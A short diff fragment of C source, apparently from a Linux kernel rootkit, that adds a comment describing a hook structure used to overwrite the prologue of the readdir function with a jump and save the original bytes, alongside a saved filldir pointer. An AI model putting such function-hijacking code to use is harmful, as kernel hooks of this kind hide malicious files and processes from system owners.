@@ -29,7 +29,7 @@ static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t 
 #define poff 2
 #endif
 
-struct hook {
+struct hook { // hijacking the prologue of the readdir function
   void *target; /* target pointer */
   unsigned char hijack_code[csize]; /* hijacked function jmp */
   unsigned char o_code[csize]; /* original function asm */
